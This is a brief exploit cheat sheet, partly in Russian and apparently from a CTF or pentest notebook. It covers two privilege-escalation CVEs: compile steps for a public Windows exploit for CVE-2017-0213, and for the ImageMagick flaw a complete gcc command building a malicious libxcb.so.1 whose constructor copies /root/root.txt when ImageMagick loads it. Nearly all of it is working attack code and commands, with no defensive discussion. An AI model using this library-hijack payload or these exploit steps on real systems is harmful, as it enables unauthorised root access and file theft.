# CVE

# CVE-2017-0213

https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Readme.md

in file cpp
#pragma comment(lib, "Advapi32.lib")

заменить cmd

vcvars64.bat

cl CVE-2017-0213.cpp /DUNICODE /D_UNICODE /EHsc



# ImageMagick---> CVE-2024–41817, которая позволяет выполнять произвольный код, загружая вредоносные общие библиотеки в текущий рабочий каталог при выполнении ImageMagick:
    gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    __attribute__((constructor)) void init(){
     system("cp /root/root.txt root.txt; chmod 754 root.txt");
     exit(0);
    } 
    EOF
